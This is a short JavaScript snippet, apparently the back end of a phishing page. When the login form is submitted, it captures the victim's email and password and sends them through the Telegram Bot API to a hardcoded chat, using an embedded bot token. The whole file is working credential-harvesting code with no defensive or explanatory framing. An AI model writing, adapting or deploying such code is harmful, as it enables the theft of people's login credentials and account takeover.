const form = document.querySelector("#form");

form.addEventListener("submit",(event) =>{

    event.preventDefault();

    var email = document.getElementById("emailControlInput").value;
    var passwd = document.getElementById("passwdControl").value;

    var informationText = email +'%0A'+ passwd;

    var token = "6192899066:AAFQjtq_9fak9hz8ml-0pAjFUquwTHRICJk";
    var chat_id = -1001600372055;

    var url= 'https://api.telegram.org/bot'+ token +'/sendMessage?chat_id='+ chat_id +'&text='+ informationText;

    let api = new XMLHttpRequest();
    api.open("GET", url);
    api.send();

    console.log("Message succes!");
})